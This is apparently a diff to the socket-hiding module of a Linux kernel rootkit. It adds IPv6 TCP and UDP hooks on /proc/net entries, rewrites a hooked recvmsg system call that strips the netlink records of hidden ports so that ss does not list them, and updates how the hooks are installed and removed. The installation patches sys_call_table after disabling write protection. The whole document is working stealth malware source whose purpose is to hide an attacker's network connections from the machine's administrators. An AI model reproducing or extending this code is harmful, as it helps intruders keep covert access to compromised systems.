@@ -32,8 +32,10 @@
 
 /* the original syscalls we are hooking */
 asmlinkage int (*original_tcp_show) (struct seq_file *m, void *v);
+asmlinkage int (*original_tcp6_show) (struct seq_file *m, void *v);
 asmlinkage int (*original_udp_show) (struct seq_file *m, void *v);
-asmlinkage ssize_t (*original_recvmsg) (int sockfd, struct msghdr *msg, int flags);
+asmlinkage int (*original_udp6_show) (struct seq_file *m, void *v);
+asmlinkage ssize_t (*original_recvmsg) (int fd, struct user_msghdr __user *msg, unsigned int flags);
 
 /* 
  * multiple call counters (and locks for it) to prevent unhooking
@@ -47,26 +49,17 @@ static int tcp_show_call_counter = 0;
 static spinlock_t tcp_show_lock;
 static unsigned long tcp_show_lock_flags;
 
+static int tcp6_show_call_counter = 0;
+static spinlock_t tcp6_show_lock;
+static unsigned long tcp6_show_lock_flags;
+
 static int udp_show_call_counter = 0;
 static spinlock_t udp_show_lock;
 static unsigned long udp_show_lock_flags;
 
-/*
- * check if we need to hide this socket.
- * only used by our manipulated recvmsg function.
- */
-static int
-hide (struct nlmsghdr *nlh)
-{
-	struct inet_diag_msg *r = NLMSG_DATA(nlh);
-	int port = ntohs(r->id.idiag_sport);
-	
-	if(is_tcp_socket_hidden(port)) {
-		return 1;
-	}
-	
-	return 0;
-}
+static int udp6_show_call_counter = 0;
+static spinlock_t udp6_show_lock;
+static unsigned long udp6_show_lock_flags;
 
 /*
  * access the port number for udp and if it should be
@@ -81,11 +74,11 @@ manipulated_tcp_show (struct seq_file* m, void *v)
 	int port;
 	struct sock *sk;
 	struct inet_sock *inet;
-
+	int retv = 0;
+	
 	if(SEQ_START_TOKEN == v) {
-		/* lock and decrease the call counter */
-		DECREASE_CALL_COUNTER(tcp_show_call_counter, &tcp_show_lock, tcp_show_lock_flags);		
-		return original_tcp_show(m,v);
+		retv = original_tcp_show(m, v);
+		goto out;
 	}
 
 	sk = (struct sock *) v;
@@ -94,14 +87,52 @@ manipulated_tcp_show (struct seq_file* m, void *v)
 
 	/* check protocol and port */
 	if(is_tcp_socket_hidden(port)) {
-		/* lock and decrease the call counter */
-		DECREASE_CALL_COUNTER(tcp_show_call_counter, &tcp_show_lock, tcp_show_lock_flags);
-		return 0;
+		ROOTKIT_DEBUG("Hidden socket for TCP port %u", port);
+		goto out;
 	}
 
+	retv = original_tcp_show(m,v);
+out:
 	/* lock and decrease the call counter */	
 	DECREASE_CALL_COUNTER(tcp_show_call_counter, &tcp_show_lock, tcp_show_lock_flags);	
-	return original_tcp_show(m,v);
+	return retv;
+}
+
+/*
+ * access the port number for udp and if it should be
+ * hidden then return 0, else return the original function
+ */
+static int
+manipulated_tcp6_show (struct seq_file* m, void *v)
+{
+	/* lock and increase the call counter */
+	INCREASE_CALL_COUNTER(tcp6_show_call_counter, &tcp6_show_lock, tcp6_show_lock_flags);
+
+	int port;
+	struct sock *sk;
+	struct inet_sock *inet;
+	int retv = 0;
+	
+	if(SEQ_START_TOKEN == v) {
+		retv = original_tcp6_show(m, v);
+		goto out;
+	}
+
+	sk = (struct sock *) v;
+	inet = inet_sk(sk);
+	port = ntohs(inet->inet_sport);
+
+	/* check protocol and port */
+	if(is_tcp_socket_hidden(port)) {
+		ROOTKIT_DEBUG("Hidden socket for TCP6 port %u", port);
+		goto out;
+	}
+
+	retv = original_tcp6_show(m,v);
+out:
+	/* lock and decrease the call counter */	
+	DECREASE_CALL_COUNTER(tcp6_show_call_counter, &tcp6_show_lock, tcp6_show_lock_flags);	
+	return retv;
 }
 
 /*
@@ -117,11 +148,11 @@ manipulated_udp_show (struct seq_file* m, void *v)
 	int port;
 	struct sock *sk;
 	struct inet_sock *inet;
+	int retv = 0;
 
 	if(SEQ_START_TOKEN == v) {
-		/* lock and decrease the call counter */
-		DECREASE_CALL_COUNTER(udp_show_call_counter, &udp_show_lock, udp_show_lock_flags);
-		return original_udp_show(m,v);
+		retv = original_udp_show(m, v);
+		goto out;
 	}
 
 	sk = (struct sock *) v;
@@ -130,69 +161,96 @@ manipulated_udp_show (struct seq_file* m, void *v)
 
 	/* check protocol and port */
 	if(is_udp_socket_hidden(port)) {
-		/* lock and decrease the call counter */
-		DECREASE_CALL_COUNTER(udp_show_call_counter, &udp_show_lock, udp_show_lock_flags);
-		return 0;
+		ROOTKIT_DEBUG("Hidden socket for UDP port %u", port);
+		goto out;
 	}
 
+	retv = original_udp_show(m,v);
+out:
 	/* lock and decrease the call counter */
 	DECREASE_CALL_COUNTER(udp_show_call_counter, &udp_show_lock, udp_show_lock_flags);
-	return original_udp_show(m,v);
+	return retv;
+}
+
+/*
+ * access the port number for udp and if it should be
+ * hidden then return 0, else return the original function
+ */
+static int
+manipulated_udp6_show (struct seq_file* m, void *v)
+{
+	/* lock and increase the call counter */
+	INCREASE_CALL_COUNTER(udp6_show_call_counter, &udp6_show_lock, udp6_show_lock_flags);
+
+	int port;
+	struct sock *sk;
+	struct inet_sock *inet;
+	int retv = 0;
+
+	if(SEQ_START_TOKEN == v) {
+		retv = original_udp6_show(m, v);
+		goto out;
+	}
+
+	sk = (struct sock *) v;
+	inet = inet_sk(sk);
+	port = ntohs(inet->inet_sport);
+
+	/* check protocol and port */
+	if(is_udp_socket_hidden(port)) {
+		ROOTKIT_DEBUG("Hidden socket for UDP6 port %u", port);
+		goto out;
+	}
+
+	retv = original_udp6_show(m,v);
+out:
+	/* lock and decrease the call counter */
+	DECREASE_CALL_COUNTER(udp6_show_call_counter, &udp6_show_lock, udp6_show_lock_flags);
+	return retv;
 }
 
 /*
  * our custom recvmsg, checks for the port number and hides it from ss
  */
 asmlinkage ssize_t
-manipulated_recvmsg (int sockfd, struct msghdr *msg, int flags)
+manipulated_recvmsg (int fd, struct user_msghdr __user *msg, unsigned int flags)
 {
 	/* lock and increase the call counter */
 	INCREASE_CALL_COUNTER(recvmsg_call_counter, &recvmsg_lock, recvmsg_lock_flags);
 
-	long ret;
-	long count;
+	ssize_t retv;
+	ssize_t remain;
+	ssize_t new_remain;
 	struct nlmsghdr *nlh;
-	char* stream;
-	int i;
-	int found=0;
-	int offset;
-		
-	nlh = (struct nlmsghdr*) (msg->msg_iov->iov_base);
-	
+	struct nlmsghdr *next_nlh;
+	unsigned int port;
+
 	/* compute the length of original call */
-	ret = original_recvmsg(sockfd,msg,flags);
+	retv = original_recvmsg(fd, msg, flags);
+
+	nlh = (struct nlmsghdr*) (msg->msg_iov->iov_base);
         
 	/* to hold the bytes remaining */
-	count = ret;
-	found = 1;
-	
-	while (NLMSG_OK(nlh, count)) { /* returns true if netlink message is suitable for parsing */
+	remain = retv;
 
-		/* if port is not found, get the next nlmsghsr in multipart message */
-		if(found == 0) {
-			nlh = NLMSG_NEXT(nlh, count);
-		}
-		
-		stream = (char*)nlh;
+	do {
+		struct inet_diag_msg *idm = NLMSG_DATA(nlh);
+		port = ntohs(idm->id.idiag_sport);
 
-		/* check if we need to hide this socket */
-        if(hide(nlh)) {
-			found = 1;
-			offset = NLMSG_ALIGN((nlh)->nlmsg_len);
-			for (i=0; i<count; ++i) {
-				stream[i] = stream[i + offset];
-			}
-                
-			ret = ret - offset;
+		if(is_tcp_socket_hidden(port)) {
+			new_remain = remain;
+			next_nlh = NLMSG_NEXT(nlh, new_remain);
+			memmove(nlh, next_nlh, new_remain);
+			retv = retv - (remain - new_remain);
+			remain = new_remain;
 		} else {
-			found = 0;
+			nlh = NLMSG_NEXT(nlh, remain);
 		}
-		
-	}
+	} while (remain > 0);
 
 	/* lock and increase the call counter */
 	DECREASE_CALL_COUNTER(recvmsg_call_counter, &recvmsg_lock, recvmsg_lock_flags);
-	return ret;
+	return retv;
 }
 
 /*
@@ -201,26 +259,40 @@ manipulated_recvmsg (int sockfd, struct msghdr *msg, int flags)
 int
 hook_sockets (void)
 {
-	int hooked = 0;
-	struct tcp_seq_afinfo *tcp_seq = 0;
-	struct udp_seq_afinfo *udp_seq = 0;
-	struct proc_dir_entry *proc = init_net.proc_net->subdir;
-	
 	/* get the location of the sys_call_table from our sysmap.h file */
 	void **sys_call_table = (void *) sysmap_sys_call_table;
+
+	int hooked = 0;
+	struct tcp_seq_afinfo *tcp_seq = 0;
+	struct tcp_seq_afinfo *tcp6_seq = 0;
+	struct udp_seq_afinfo *udp_seq = 0;
+	struct udp_seq_afinfo *udp6_seq = 0;
+	struct rb_root root = init_net.proc_net->subdir;
+	struct rb_node *node = rb_first(&root);
+	struct proc_dir_entry *proc;
 	
 	ROOTKIT_DEBUG("Loading socket hiding...\n");
 	
 	/* loop all proc entries */
-	while(proc) {
-	
+	while(node) {
+		proc = rb_entry(node, struct proc_dir_entry, subdir_node);
+		
 		/* hook tcp_show */
 		if(strcmp(proc->name, "tcp") == 0) {	
 			tcp_seq = proc->data;
 			original_tcp_show = tcp_seq->seq_ops.show;
 			tcp_seq->seq_ops.show = manipulated_tcp_show;
-			
 			hooked++;
+			ROOTKIT_DEBUG("Hooked /proc/net/tcp");
+		}
+		
+		/* hook tcp6_show */
+		if(strcmp(proc->name, "tcp6") == 0) {
+			tcp6_seq = proc->data;
+			original_tcp6_show = tcp6_seq->seq_ops.show;
+			tcp6_seq->seq_ops.show = manipulated_tcp6_show;
+			hooked++;
+			ROOTKIT_DEBUG("Hooked /proc/net/tcp6");
 		}
 		
 		/* hook udp_show */
@@ -228,17 +300,26 @@ hook_sockets (void)
 			udp_seq = proc->data;
 			original_udp_show = udp_seq->seq_ops.show;
 			udp_seq->seq_ops.show = manipulated_udp_show;
-			
 			hooked++;
+			ROOTKIT_DEBUG("Hooked /proc/net/udp");
+		}
+		
+		/* hook udp6_show */
+		if(strcmp(proc->name, "udp6") == 0) {
+			udp6_seq = proc->data;
+			original_udp6_show = udp6_seq->seq_ops.show;
+			udp6_seq->seq_ops.show = manipulated_udp6_show;
+			hooked++;
+			ROOTKIT_DEBUG("Hooked /proc/net/udp6");
 		}
 		
 		/* lets skip the other entries if we are done */
-		if(hooked >= 2) {
+		if(hooked >= 4) {
 			break;
 		}
 		
 		/* go to the next entry */
-		proc = proc->next;
+		node = rb_next(node);
 	}
 
 	/* disable the write-protection */
@@ -250,7 +331,7 @@ hook_sockets (void)
 	 * manipulated_recvmsg
 	 */
 	original_recvmsg = (void *) sys_call_table[__NR_recvmsg];
-	sys_call_table[__NR_recvmsg] = (unsigned long*) manipulated_recvmsg;
+	sys_call_table[__NR_recvmsg] = (ssize_t *) manipulated_recvmsg;
         
 	/* reenable the write-protection */
 	enable_page_protection();
@@ -268,8 +349,12 @@ unhook_sockets (void)
 {
 	int restored = 0;
 	struct tcp_seq_afinfo *tcp_seq = 0;
+	struct tcp_seq_afinfo *tcp6_seq = 0;
 	struct udp_seq_afinfo *udp_seq = 0;
-	struct proc_dir_entry *proc = init_net.proc_net->subdir;
+	struct udp_seq_afinfo *udp6_seq = 0;
+	struct rb_root root = init_net.proc_net->subdir;
+	struct rb_node *node = rb_first(&root);
+	struct proc_dir_entry *proc;
 	
 	/* get the location of the sys_call_table from our sysmap.h file */
 	void **sys_call_table = (void *) sysmap_sys_call_table;
@@ -277,38 +362,55 @@ unhook_sockets (void)
 	ROOTKIT_DEBUG("Unloading socket hiding...\n");
 	
 	/* loop all proc entries */
-	while(proc) {
+	while(node) {
+		proc = rb_entry(node, struct proc_dir_entry, subdir_node);
 	
 		/* restore tcp_show */
 		if(strcmp(proc->name, "tcp") == 0) {
-            tcp_seq = proc->data;
-	        tcp_seq->seq_ops.show = original_tcp_show;
-			
+			tcp_seq = proc->data;
+			tcp_seq->seq_ops.show = original_tcp_show;
 			restored++;
-        }
-		
+			ROOTKIT_DEBUG("Restored /proc/net/tcp");
+		}
+	
+		/* restore tcp6_show */
+		if(strcmp(proc->name, "tcp6") == 0) {
+			tcp6_seq = proc->data;
+			tcp6_seq->seq_ops.show = original_tcp6_show;
+			restored++;
+			ROOTKIT_DEBUG("Restored /proc/net/tcp6");
+		}
+
 		/* restore udp_show */
 		if(strcmp(proc->name, "udp") == 0) {
 			udp_seq = proc->data;
 			udp_seq->seq_ops.show = original_udp_show;
-			
-			restored ++;
+			restored++;
+			ROOTKIT_DEBUG("Restored /proc/net/udp");
+		}
+
+		/* restore udp6_show */
+		if(strcmp(proc->name, "udp6") == 0) {
+			udp6_seq = proc->data;
+			udp6_seq->seq_ops.show = original_udp6_show;
+			restored++;
+			ROOTKIT_DEBUG("Restored /proc/net/udp6");
 		}
 		
 		/* lets skip the other entries if we are done */
-		if(restored >= 2) {
+		if(restored >= 4) {
 			break;
 		}
 		
 		/* go to the next entry */
-		proc = proc->next;
+		node = rb_next(node);
 	}
 		
 	/* disable the write-protection */
 	disable_page_protection();
 
 	/* Return the system call back to original */
-	sys_call_table[__NR_recvmsg] = (unsigned long *) original_recvmsg;
+	sys_call_table[__NR_recvmsg] = (ssize_t *) original_recvmsg;
 
 	/* reenable the write-protection */
 	enable_page_protection();
